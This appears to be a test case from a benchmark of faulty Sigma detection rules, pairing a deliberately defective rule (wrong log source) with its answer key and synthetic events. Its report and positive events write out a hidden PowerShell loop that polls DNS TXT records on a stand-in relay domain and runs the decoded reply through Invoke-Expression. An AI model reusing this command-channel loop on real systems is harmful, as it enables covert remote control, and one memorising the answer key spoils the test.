@@ -1,0 +1,106 @@
+id: D5-06
+role: defective
+defect_class: D5
+evasive: true
+why: 'The rule claims the available category dns_query, yet it contains no condition on QueryName or Image;
+  its only discriminating field is ScriptBlockText, which exists only in the PowerShell script block log
+  (windows_powershell_script_block, available: false), and the opportunity requires that source.'
+expected_gate: G6
+report_text: 'A threat actor targeting a logistics software vendor used DNS TXT records as a low-bandwidth
+  command channel from PowerShell. The launcher was heavily obfuscated and the process command line did
+  not expose the domain. With script block logging (event 4104) enabled, the decoded loop was visible:
+  it called Resolve-DnsName with the TXT record type against a per-victim subdomain of beacon-relay.invalid,
+  decoded the returned string and passed it to Invoke-Expression. The recovered fragment was: Resolve-DnsName
+  -Type TXT -Name ($hostId + ''.beacon-relay.invalid''). Polling occurred about every 90 seconds. We note
+  that the DNS responses were short Base64 strings, which kept each exchange small enough to blend into
+  normal resolver traffic. The reliable indicator is the script text itself, because the query name varies
+  with the victim identifier prefix.'
+evidence:
+- Resolve-DnsName -Type TXT -Name ($hostId + '.beacon-relay.invalid')
+- it called Resolve-DnsName with the TXT record type against a per-victim subdomain of beacon-relay.invalid
+logsource: windows_powershell_script_block
+techniques:
+- T1071.004
+- T1059.001
+sigma_yaml: |
+  title: PowerShell DNS TXT Command Channel To Beacon Relay Domain
+  id: 52d8a9f1-0b7e-4c63-9e84-6a1c3f7d2b66
+  status: experimental
+  description: Detects a PowerShell session that polls TXT records on the relay domain named in the report using Resolve-DnsName.
+  references:
+    - urn:atidep:case
+  author: case-author
+  date: 2026/10/02
+  tags:
+    - attack.command_and_control
+    - attack.t1071.004
+    - attack.execution
+    - attack.t1059.001
+  logsource:
+    category: dns_query
+    product: windows
+  detection:
+    selection:
+      ScriptBlockText|contains|all:
+        - Resolve-DnsName
+        - '-Type TXT'
+        - 'beacon-relay.invalid'
+    condition: selection
+  falsepositives:
+    - Administrators validating TXT records for the relay domain during a change
+  level: high
+assumptions: []
+events:
+  positive:
+  - kind: process_create
+    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmd: powershell.exe -NoProfile -Command "Resolve-DnsName -Type TXT -Name ($hostId + '.beacon-relay.invalid')"
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\dev-mia
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmd: powershell.exe -nop -w hidden -c "while($true){$r = Resolve-DnsName -Type TXT -Name ($hostId
+      + '.beacon-relay.invalid'); Start-Sleep 90}"
+    parent: C:\Windows\System32\wscript.exe
+    parent_cmd: wscript.exe C:\Users\Public\sync.vbs
+    user: LAB\dev-mia
+    dest_ip: null
+    dest_port: null
+    name: null
+  negative:
+  - kind: process_create
+    image: C:\Windows\System32\whoami.exe
+    cmd: whoami /all
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\noah
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\PING.EXE
+    cmd: ping.exe fileserver01.corp.example
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\noah
+    dest_ip: null
+    dest_port: null
+    name: null
+  lookalike:
+  - kind: process_create
+    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmd: powershell.exe -NoProfile -Command "Resolve-DnsName -Type TXT -Name _dmarc.mail.example"
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\mailadmin-olga
+    dest_ip: null
+    dest_port: null
+    name: null
+tamper_sigma_yaml: ''
+review: {}
+excluded: false
+exclusion_reason: ''
